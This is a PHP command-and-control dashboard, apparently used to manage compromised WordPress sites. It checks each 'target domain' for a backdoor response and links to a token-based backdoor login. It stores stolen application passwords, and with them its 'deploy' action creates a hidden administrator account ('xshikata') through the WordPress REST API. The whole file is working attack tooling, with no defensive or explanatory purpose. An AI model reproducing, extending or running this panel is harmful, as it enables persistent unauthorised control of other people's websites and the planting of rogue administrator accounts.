<?php
session_start();
$pass_akses = '1337';

// --- AUTH ---
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . strtok($_SERVER["REQUEST_URI"], '?'));
    exit;
}
if (isset($_POST['auth_pass'])) {
    if ($_POST['auth_pass'] === $pass_akses) {
        $_SESSION['is_logged_in'] = true;
    } else {
        $error_login = "Access Denied.";
    }
}
if (!isset($_SESSION['is_logged_in']) || $_SESSION['is_logged_in'] !== true) {
?>
<!DOCTYPE html>
<html>
<head>
    <title>QUANTUM ACCESS</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&family=JetBrains+Mono:wght@500&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-deep: #050505;
            --glass: rgba(20, 20, 25, 0.8);
            --glass-border: rgba(255, 255, 255, 0.1);
            --accent: #00e5ff;
        }
        body { 
            margin: 0; background: var(--bg-deep); color: #fff; 
            font-family: 'Inter', sans-serif; height: 100vh; display: grid; place-items: center; 
            background-image: radial-gradient(circle at 50% 0%, rgba(0, 229, 255, 0.15) 0%, transparent 70%);
        }
        .login-box { 
            width: 90%; max-width: 340px; padding: 40px; 
            background: var(--glass); backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px);
            border: 1px solid var(--glass-border); border-radius: 16px; text-align: center;
            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
        }
        h2 { margin: 0 0 30px 0; font-weight: 800; letter-spacing: 2px; color: var(--accent); text-shadow: 0 0 20px rgba(0, 229, 255, 0.6); }
        input { 
            width: 100%; padding: 14px; background: rgba(0,0,0,0.4); border: 1px solid var(--glass-border); 
            border-radius: 8px; color: #fff; margin-bottom: 20px; outline: none; 
            text-align: center; font-family: 'JetBrains Mono', monospace; transition: 0.3s; box-sizing: border-box;
        }
        input:focus { border-color: var(--accent); box-shadow: 0 0 15px rgba(0, 229, 255, 0.2); }
        button { 
            width: 100%; padding: 14px; background: var(--accent); color: #000; border: none; 
            border-radius: 8px; font-weight: 800; cursor: pointer; transition: 0.3s;
        }
        button:hover { background: #fff; box-shadow: 0 0 20px var(--accent); }
        .err { color: #ff4444; font-size: 0.85rem; margin-bottom: 15px; font-weight: 600; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>SYSTEM ID</h2>
        <?php if(isset($error_login)) echo "<div class='err'>$error_login</div>"; ?>
        <form method="POST">
            <input type="password" name="auth_pass" placeholder="PASSKEY" autocomplete="off">
            <button>ENTER</button>
        </form>
    </div>
</body>
</html>
<?php exit; } 

// --- 2. BACKEND LOGIC ---
$secret_key = 'wtf';
$json_file  = 'result.json';
$cache_file = 'status_cache.json';
$cache_time = 300; 

$sites_raw  = file_exists($json_file) ? json_decode(file_get_contents($json_file), true) : [];
$toast      = '';

$search_query = isset($_GET['q']) ? strtolower(trim($_GET['q'])) : '';
$filter_status = isset($_GET['status']) ? $_GET['status'] : 'all';
$force_refresh = isset($_GET['refresh']);

function set_toast($type, $msg) {
    $clean_msg = addslashes($msg);
    return "window.onload = function() { showToast('$type', '$clean_msg'); };";
}

// Fungsi Bersihkan URL untuk Tampilan
function clean_url_display($url) {
    // Hapus http:// atau https:// dan slash di akhir
    return preg_replace('#^https?://#', '', rtrim($url, '/'));
}

function curl_api($url, $user, $pass, $post_fields = []) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_USERPWD, "$user:$pass"); curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post_fields));
    curl_setopt($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    $res = curl_exec($ch); $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch); return ['code' => $code, 'body' => $res];
}

function check_live($domain) {
    $nocache = time(); 
    $url = rtrim($domain, '/') . "/?rls_action=check_status&_t=" . $nocache;
    $ch = curl_init($url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); 
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36');
    curl_setopt($ch, CURLOPT_REFERER, 'https://www.google.com/');
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Cache-Control: no-cache', 'Pragma: no-cache', 'Connection: keep-alive']);
    $res = curl_exec($ch); curl_close($ch);
    return (strpos($res, 'LIVE_SIGNAL_ACK') !== false);
}

// --- CACHING LOGIC ---
$processed_sites = [];
$cache_exists = file_exists($cache_file);
$cache_age = $cache_exists ? (time() - filemtime($cache_file)) : 9999;

if ($cache_exists && $cache_age < $cache_time && !$force_refresh) {
    $processed_sites = json_decode(file_get_contents($cache_file), true);
    foreach ($sites_raw as $k => $s) {
        if (isset($processed_sites[$k])) {
            $processed_sites[$k]['api_user'] = $s['api_user'];
            $processed_sites[$k]['api_pass'] = $s['api_pass'];
        } else {
            $s['status'] = 'unknown'; $processed_sites[$k] = $s;
        }
    }
} else {
    foreach ($sites_raw as $key => $s) {
        $is_live = check_live($s['domain']);
        $s['status'] = $is_live ? 'live' : 'died';
        $processed_sites[$key] = $s;
    }
    file_put_contents($cache_file, json_encode($processed_sites));
    if($force_refresh) $toast = set_toast('success', 'System Scanned Updated!');
}

// --- HANDLERS ---
if (isset($_POST['save_key'])) {
    $k = $_POST['key_id'];
    if (isset($sites_raw[$k])) {
        $sites_raw[$k]['api_user'] = trim($_POST['manual_user']);
        $sites_raw[$k]['api_pass'] = trim($_POST['manual_pass']);
        file_put_contents($json_file, json_encode($sites_raw));
        $processed_sites[$k]['api_user'] = $sites_raw[$k]['api_user'];
        $processed_sites[$k]['api_pass'] = $sites_raw[$k]['api_pass'];
        $toast = set_toast('success', 'Credentials Saved!');
    }
}

if (isset($_POST['deploy'])) {
    $k = $_POST['key_id'];
    $site = $processed_sites[$k];
    if (!empty($site['api_user']) && !empty($site['api_pass'])) {
        $base = rtrim($site['domain'], '/');
        $payload = ['username'=>'xshikata', 'password'=>'Lulz1337', 'email'=>'xshikata@localhost.com', 'roles'=>'administrator'];
        $res = curl_api($base . "/wp-json/wp/v2/users", $site['api_user'], $site['api_pass'], $payload);
        if ($res['code'] == 404) $res = curl_api($base . "/?rest_route=/wp/v2/users", $site['api_user'], $site['api_pass'], $payload);
        
        $body = strtolower($res['body']);
        if ($res['code'] == 201) $toast = set_toast('success', 'SUCCESS: User xshikata deployed!');
        elseif (strpos($body, 'existing_user') !== false) $toast = set_toast('warning', 'INFO: User xshikata already exists.');
        elseif ($res['code'] == 401 || $res['code'] == 403) $toast = set_toast('error', 'FAILED: Authentication rejected.');
        else $toast = set_toast('error', 'API Error: ' . $res['code']);
    } else { $toast = set_toast('error', 'ERROR: Missing Credentials.'); }
}

if (isset($_POST['remove_single'])) {
    $k = $_POST['key_id'];
    if (isset($sites_raw[$k])) {
        unset($sites_raw[$k]);
        file_put_contents($json_file, json_encode($sites_raw));
        if(file_exists($cache_file)) unlink($cache_file);
        $toast = set_toast('success', 'Domain removed.');
        header("Refresh:1");
    }
}

if (isset($_POST['bulk_remove']) && !empty($_POST['selected_keys'])) {
    $count = 0;
    foreach ($_POST['selected_keys'] as $k) {
        if (isset($sites_raw[$k])) {
            unset($sites_raw[$k]);
            $count++;
        }
    }
    if ($count > 0) {
        file_put_contents($json_file, json_encode($sites_raw));
        if(file_exists($cache_file)) unlink($cache_file);
        $toast = set_toast('success', "$count Domains removed.");
        header("Refresh:1");
    }
}

$final_sites = [];
$stats = ['total' => count($processed_sites), 'live' => 0, 'died' => 0];
foreach ($processed_sites as $key => $s) {
    if ($search_query && strpos(strtolower($s['domain']), $search_query) === false) continue;
    $is_live = ($s['status'] === 'live');
    if ($is_live) $stats['live']++; else $stats['died']++;
    if ($filter_status === 'live' && !$is_live) continue;
    if ($filter_status === 'died' && $is_live) continue;
    $final_sites[$key] = $s;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Quantum V43 Clean</title>
    <style>
        :root {
            --bg-deep: #050505;
            --glass: rgba(20, 20, 25, 0.6);
            --glass-border: rgba(255, 255, 255, 0.08);
            --text-main: #eee;
            --text-muted: #777;
            --accent: #00e5ff;
            --success: #00ff9d;
            --warning: #ffcc00;
            --error: #ff3333;
            --font-ui: 'Inter', sans-serif;
            --font-code: 'JetBrains Mono', monospace;
            --blur: blur(12px);
        }

        body { 
            margin: 0; background: var(--bg-deep); color: var(--text-main); 
            font-family: var(--font-ui); font-size: 14px; min-height: 100vh;
            background-image: 
                radial-gradient(circle at 20% 30%, rgba(0, 229, 255, 0.15) 0%, transparent 40%),
                radial-gradient(circle at 80% 70%, rgba(0, 255, 157, 0.1) 0%, transparent 40%);
            background-size: 100% 100%;
            background-attachment: fixed;
        }
        * { box-sizing: border-box; }
        a { text-decoration: none; color: inherit; }

        .wrapper { max-width: 1200px; margin: 0 auto; padding: 40px 20px; }

        header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; }
        .logo { font-size: 1.2rem; font-weight: 800; letter-spacing: 1px; color: #fff; display: flex; align-items: center; gap: 10px; text-shadow: 0 0 10px rgba(0,229,255,0.5); }
        .logo span { color: var(--accent); }
        .head-actions { display: flex; gap: 10px; }
        .btn-head { font-size: 0.8rem; font-weight: 600; color: var(--text-muted); border: 1px solid var(--glass-border); padding: 8px 16px; border-radius: 50px; transition: 0.3s; background: rgba(0,0,0,0.3); display: flex; align-items: center; gap: 6px;}
        .btn-head:hover { background: rgba(255,255,255,0.1); color: #fff; }
        .btn-scan { color: var(--accent); border-color: rgba(0, 229, 255, 0.3); }
        .btn-scan:hover { background: rgba(0, 229, 255, 0.1); box-shadow: 0 0 15px rgba(0, 229, 255, 0.3); }
        .btn-logout:hover { border-color: var(--error); color: var(--error); background: rgba(255, 51, 51, 0.1); }

        .stats-hud { display: flex; background: var(--glass); backdrop-filter: var(--blur); -webkit-backdrop-filter: var(--blur); border: 1px solid var(--glass-border); border-radius: 12px; padding: 25px 0; margin-bottom: 25px; box-shadow: 0 20px 40px -10px rgba(0,0,0,0.6); }
        .stat-item { flex: 1; text-align: center; border-right: 1px solid rgba(255,255,255,0.05); display: flex; flex-direction: column; justify-content: center; }
        .stat-item:last-child { border-right: none; }
        .stat-val { font-size: 2.2rem; font-weight: 800; color: #fff; line-height: 1; margin-bottom: 5px; text-shadow: 0 0 15px rgba(255,255,255,0.15); }
        .stat-lbl { font-size: 0.75rem; color: var(--text-muted); font-weight: 600; text-transform: uppercase; letter-spacing: 1px; }

        .toolbar { display: flex; gap: 0; background: rgba(10, 10, 12, 0.6); border: 1px solid var(--glass-border); border-radius: 12px; margin-bottom: 25px; overflow: hidden; height: 50px; }
        .search-wrap { flex: 1; position: relative; border-right: 1px solid var(--glass-border); }
        .search-wrap input { width: 100%; height: 100%; background: transparent; border: none; color: #fff; padding: 0 15px 0 45px; outline: none; font-family: var(--font-ui); font-size: 0.95rem; }
        .search-icon { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); width: 18px; color: var(--text-muted); }
        .search-wrap input:focus ~ .search-icon { color: var(--accent); }
        .select-wrap { position: relative; width: 160px; border-right: 1px solid var(--glass-border); }
        .select-wrap select { width: 100%; height: 100%; background: transparent; border: none; color: #ccc; padding: 0 15px; outline: none; cursor: pointer; font-family: var(--font-ui); font-size: 0.9rem; appearance: none; }
        .select-arrow { position: absolute; right: 15px; top: 50%; transform: translateY(-50%); pointer-events: none; color: var(--text-muted); font-size: 0.8rem; }
        .btn-filter { background: rgba(255,255,255,0.02); color: var(--accent); border: none; padding: 0 30px; font-weight: 700; cursor: pointer; transition: 0.2s; font-size: 0.85rem; letter-spacing: 0.5px; }
        .btn-filter:hover { background: var(--accent); color: #000; box-shadow: 0 0 20px var(--accent); }
        .btn-bulk-del { display: none; background: rgba(239, 68, 68, 0.2); color: #ef4444; border: none; padding: 0 25px; border-left: 1px solid var(--glass-border); font-weight: 700; cursor: pointer; transition: 0.2s; font-size: 0.85rem; letter-spacing: 0.5px; white-space: nowrap; }
        .btn-bulk-del:hover { background: #ef4444; color: #fff; box-shadow: 0 0 20px rgba(239, 68, 68, 0.5); }

        /* DATA TABLE */
        .data-card { background: var(--glass); backdrop-filter: var(--blur); -webkit-backdrop-filter: var(--blur); border: 1px solid var(--glass-border); border-radius: 12px; overflow: hidden; box-shadow: 0 20px 50px -20px rgba(0,0,0,0.5); }
        .data-table { width: 100%; border-collapse: collapse; text-align: left; }
        
        .data-table th { 
            background: rgba(0,0,0,0.3); color: var(--text-muted); font-size: 0.75rem; text-transform: uppercase; 
            padding: 18px 15px; border-bottom: 1px solid var(--glass-border); font-weight: 700; letter-spacing: 1px;
        }
        .data-table td { padding: 18px 15px; border-bottom: 1px solid var(--glass-border); vertical-align: middle; color: var(--text-main); }
        .data-table tr:last-child td { border-bottom: none; }
        .data-table tr:hover { background: rgba(255,255,255,0.03); }

        /* CHECKBOX COLUMN FIX */
        .chk-col { width: 50px; text-align: center; }
        .custom-chk {
            appearance: none; width: 20px; height: 20px; border: 1px solid rgba(255,255,255,0.3);
            border-radius: 5px; background: rgba(0,0,0,0.5); cursor: pointer; position: relative; transition: 0.2s;
            vertical-align: middle;
        }
        .custom-chk:checked { background: var(--accent); border-color: var(--accent); box-shadow: 0 0 10px var(--accent); }
        .custom-chk:checked::after { content: '✔'; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: #000; font-size: 12px; font-weight: bold; }

        .domain-main { font-weight: 700; font-size: 1rem; color: #fff; font-family: var(--font-code); letter-spacing: -0.5px; word-break: break-all; } /* Added word-break */
        .badge { display: inline-flex; align-items: center; gap: 6px; padding: 5px 12px; border-radius: 6px; font-size: 0.7rem; font-weight: 700; text-transform: uppercase; border: 1px solid transparent; }
        .b-live { background: rgba(0, 255, 157, 0.1); color: var(--success); border-color: rgba(0, 255, 157, 0.3); box-shadow: 0 0 10px rgba(0, 255, 157, 0.15); }
        .b-dead { background: rgba(255, 61, 0, 0.1); color: var(--error); border-color: rgba(255, 61, 0, 0.3); }
        .dot { width: 6px; height: 6px; border-radius: 50%; background: currentColor; box-shadow: 0 0 6px currentColor; }
        .key-stat { font-size: 0.75rem; color: var(--text-muted); font-family: var(--font-code); }
        .k-ok { color: var(--accent); text-shadow: 0 0 8px rgba(0, 229, 255, 0.4); }

        .actions { display: flex; gap: 8px; justify-content: flex-end; }
        .act-btn { width: 38px; height: 38px; display: flex; align-items: center; justify-content: center; border-radius: 8px; transition: 0.2s; border: 1px solid; cursor: pointer; background: transparent; }
        .act-btn svg { width: 20px; height: 20px; }
        .btn-login { border-color: #3b82f6; color: #3b82f6; background: rgba(59, 130, 246, 0.05); } .btn-login:hover { background: #3b82f6; color: #fff; box-shadow: 0 0 15px rgba(59, 130, 246, 0.5); }
        .btn-key { border-color: #f59e0b; color: #f59e0b; background: rgba(245, 158, 11, 0.05); } .btn-key:hover { background: #f59e0b; color: #000; box-shadow: 0 0 15px rgba(245, 158, 11, 0.5); }
        .btn-deploy { border-color: #10b981; color: #10b981; background: rgba(16, 185, 129, 0.05); } .btn-deploy:hover { background: #10b981; color: #000; box-shadow: 0 0 15px rgba(16, 185, 129, 0.5); } .btn-deploy:disabled { opacity: 0.2; cursor: not-allowed; filter: grayscale(1); }
        .btn-trash { border-color: #ef4444; color: #ef4444; background: rgba(239, 68, 68, 0.05); } .btn-trash:hover { background: #ef4444; color: #fff; box-shadow: 0 0 15px rgba(239, 68, 68, 0.5); }

        .modal-overlay { display: none; position: fixed; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.8); backdrop-filter: blur(8px); z-index: 100; align-items: center; justify-content: center; }
        .modal { background: #0a0a0c; border: 1px solid var(--glass-border); width: 90%; max-width: 420px; padding: 35px; border-radius: 20px; box-shadow: 0 40px 80px rgba(0,0,0,0.9); }
        .modal h3 { margin: 0 0 25px; font-size: 1.2rem; color: #fff; text-align: center; }
        .form-g { margin-bottom: 20px; }
        .form-g label { display: block; font-size: 0.75rem; color: var(--text-muted); margin-bottom: 8px; font-weight: 600; }
        .form-g input { width: 100%; background: #000; border: 1px solid var(--glass-border); padding: 14px; color: #fff; border-radius: 8px; outline: none; transition:0.3s; font-family: var(--font-code); box-sizing: border-box; }
        .form-g input:focus { border-color: var(--accent); }
        .modal-foot { display: flex; gap: 15px; margin-top: 10px; }
        .btn-act { flex: 1; padding: 14px; border-radius: 8px; border: none; font-weight: 700; cursor: pointer; transition: 0.3s; }
        .b-save { background: var(--accent); color: #000; } .b-save:hover { box-shadow: 0 0 20px rgba(0,240,255,0.4); }
        .b-cancel { background: transparent; border: 1px solid var(--glass-border); color: #888; } .b-cancel:hover { color: #fff; border-color: #fff; }

        #toast-box { position: fixed; bottom: 30px; right: 30px; display: flex; flex-direction: column; gap: 10px; z-index: 9999; }
        .toast { background: #0f0f13; border: 1px solid var(--glass-border); padding: 15px 25px; border-radius: 8px; color: #fff; font-size: 0.95rem; font-weight: 600; display: flex; align-items: center; gap: 15px; box-shadow: 0 10px 40px rgba(0,0,0,0.8); border-left: 4px solid; animation: slideUp 0.3s ease; }
        .t-success { border-color: var(--success); color: var(--success); } .t-warning { border-color: var(--warning); color: var(--warning); } .t-error { border-color: var(--error); color: var(--error); }
        @keyframes slideUp { from{transform:translateY(20px);opacity:0} to{transform:translateY(0);opacity:1} }

        @media (max-width: 768px) {
            .wrapper { padding: 20px 15px; } .stats-hud { flex-direction: row; padding: 15px 0; gap: 0; }
            .stat-item { border-right: 1px solid rgba(255,255,255,0.1); } .stat-val { font-size: 1.4rem; } .stat-lbl { font-size: 0.65rem; }
            .toolbar { height: auto; background: transparent; border: none; display: grid; grid-template-columns: 1fr 1fr; gap: 10px; border-radius: 0; }
            .search-wrap { grid-column: 1 / -1; background: rgba(10, 10, 12, 0.8); border: 1px solid var(--glass-border); border-radius: 10px; height: 45px; border-right: 1px solid var(--glass-border); }
            .select-wrap { width: 100%; background: rgba(10, 10, 12, 0.8); border: 1px solid var(--glass-border); border-radius: 10px; height: 45px; }
            .btn-filter { width: 100%; border-radius: 10px; height: 45px; font-size: 0.8rem; }
            .btn-bulk-del { grid-column: 1 / -1; width: 100%; border-radius: 10px; height: 45px; background: #ef4444; color: white; border: none; }
            .data-table { display: block; overflow-x: auto; white-space: nowrap; } .data-table th, .data-table td { padding: 12px 15px; }
            
            /* CHANGE: Specific Mobile Font Size for Domain */
            .domain-main { font-size: 0.85rem; }
        }
    </style>
</head>
<body>

<div class="wrapper">
    <header>
        <div class="logo">QUANTUM <span>HUD</span></div>
        <div class="head-actions">
            <a href="?refresh=true" class="btn-head btn-scan"><svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"/></svg> SCAN NOW</a>
            <a href="?logout=true" class="btn-head btn-logout">LOGOUT</a>
        </div>
    </header>

    <div class="stats-hud">
        <div class="stat-item"><div class="stat-val"><?php echo $stats['total']; ?></div><div class="stat-lbl">Total Targets</div></div>
        <div class="stat-item"><div class="stat-val" style="color:var(--success)"><?php echo $stats['live']; ?></div><div class="stat-lbl">Systems Online</div></div>
        <div class="stat-item"><div class="stat-val" style="color:var(--error)"><?php echo $stats['died']; ?></div><div class="stat-lbl">Offline</div></div>
    </div>

    <form method="POST" id="mainForm">
        <div class="toolbar">
            <div class="search-wrap">
                <input type="text" name="q" placeholder="Search domain..." value="<?php echo htmlspecialchars($search_query); ?>" onkeypress="if(event.key === 'Enter') { event.preventDefault(); this.form.method='GET'; this.form.submit(); }">
                <svg class="search-icon" fill="currentColor" viewBox="0 0 24 24"><path d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg>
            </div>
            <div class="select-wrap">
                <select name="status" onchange="this.form.method='GET'; this.form.submit();">
                    <option value="all" <?php echo $filter_status=='all'?'selected':''; ?>>All Status</option>
                    <option value="live" <?php echo $filter_status=='live'?'selected':''; ?>>Online Only</option>
                    <option value="died" <?php echo $filter_status=='died'?'selected':''; ?>>Offline Only</option>
                </select>
                <div class="select-arrow">▼</div>
            </div>
            <button class="btn-filter" type="button" onclick="this.form.method='GET'; this.form.submit();">APPLY</button>
            <button type="submit" name="bulk_remove" class="btn-bulk-del" id="btnBulk" onclick="return confirm('Remove selected?');">DELETE SELECTED</button>
        </div>

        <div class="data-card">
            <table class="data-table">
                <thead>
                    <tr>
                        <th class="chk-col"><input type="checkbox" class="custom-chk" id="selectAll"></th>
                        <th>Target Domain</th>
                        <th>Status</th>
                        <th>Credentials</th>
                        <th style="text-align:right">Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <?php if(empty($final_sites)): ?>
                        <tr><td colspan="5" style="text-align:center; padding:40px; color:var(--text-muted)">No data found.</td></tr>
                    <?php else: foreach($final_sites as $key => $s): ?>
                        <?php 
                            $has_key = !empty($s['api_pass']);
                            $is_live = ($s['status'] === 'live');
                            $login_url = rtrim($s['domain'], '/') . "/?rls_action=login&token=" . $secret_key;
                        ?>
                        <tr>
                            <td class="chk-col"><input type="checkbox" name="selected_keys[]" value="<?php echo $key; ?>" class="custom-chk item-chk"></td>
                            <td><div class="domain-main"><?php echo clean_url_display($s['domain']); ?></div></td>
                            <td><span class="badge <?php echo $is_live?'b-live':'b-dead'; ?>"><span class="dot"></span> <?php echo $is_live ? 'Live' : 'Dead'; ?></span></td>
                            <td><span class="key-stat <?php echo $has_key?'k-ok':''; ?>"><?php echo $has_key ? 'KEY SECURED' : 'NO KEY'; ?></span></td>
                            <td>
                                <div class="actions">
                                    <a href="<?php echo $login_url; ?>" target="_blank" class="act-btn btn-login" title="Login"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"/><polyline points="10 17 15 12 10 7"/><line x1="15" y1="12" x2="3" y2="12"/></svg></a>
                                    <button type="button" onclick="openModal('<?php echo $key; ?>', '<?php echo htmlspecialchars($s['api_user']); ?>')" class="act-btn btn-key" title="Key"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg></button>
                                    <button type="submit" name="deploy" value="1" onclick="this.form.key_id.value='<?php echo $key; ?>'; showLoading(this.form);" class="act-btn btn-deploy" title="Add Admin" <?php echo !$has_key?'disabled':''; ?>><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M18 9v3m0 0v3m0-3h3m-3 0h-3m-2-5a4 4 0 11-8 0 4 4 0 018 0zM3 20a6 6 0 0112 0v1H3v-1z"></path></svg></button>
                                    <button type="submit" name="remove_single" value="1" onclick="this.form.key_id.value='<?php echo $key; ?>'; return confirm('Remove?');" class="act-btn btn-trash" title="Remove"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"/></svg></button>
                                </div>
                            </td>
                        </tr>
                    <?php endforeach; endif; ?>
                </tbody>
            </table>
        </div>
        <input type="hidden" name="key_id" value="">
    </form>
</div>

<div id="keyModal" class="modal-overlay">
    <div class="modal">
        <h3>CREDENTIAL MANAGER</h3>
        <form method="POST" onsubmit="showLoading(this)">
            <input type="hidden" id="modalKeyId" name="key_id">
            <div class="form-g"><label>USERNAME</label><input type="text" id="modalUser" name="manual_user" required></div>
            <div class="form-g"><label>APP PASSWORD</label><input type="text" name="manual_pass" required></div>
            <div class="modal-foot"><button type="button" onclick="document.getElementById('keyModal').style.display='none'" class="btn-act b-cancel">CANCEL</button><button name="save_key" class="btn-act b-save">SAVE KEY</button></div>
        </form>
    </div>
</div>

<div id="toast-box"></div>

<script>
    const selectAll = document.getElementById('selectAll');
    const checkboxes = document.querySelectorAll('.item-chk');
    const bulkBtn = document.getElementById('btnBulk');

    function toggleBulkBtn() {
        let anyChecked = false; checkboxes.forEach(cb => { if(cb.checked) anyChecked = true; });
        bulkBtn.style.display = anyChecked ? 'block' : 'none';
    }
    if(selectAll) { selectAll.addEventListener('change', function() { checkboxes.forEach(cb => cb.checked = selectAll.checked); toggleBulkBtn(); }); }
    checkboxes.forEach(cb => { cb.addEventListener('change', toggleBulkBtn); });

    function showLoading(form) { /* optional loading visual */ }
    function openModal(key, user) { document.getElementById('modalKeyId').value = key; document.getElementById('modalUser').value = user; document.getElementById('keyModal').style.display = 'flex'; }
    function showToast(type, msg) {
        const c = document.getElementById('toast-box'); const t = document.createElement('div'); t.className = `toast t-${type}`;
        let icon = type==='success' ? '✓' : (type==='warning' ? '!' : '✕');
        t.innerHTML = `<span>${icon}</span> <span>${msg}</span>`; c.appendChild(t);
        setTimeout(() => { t.style.opacity='0'; setTimeout(()=>t.remove(), 300); }, 3500);
    }
</script>
<script><?php echo $toast; ?></script>
</body>
</html>
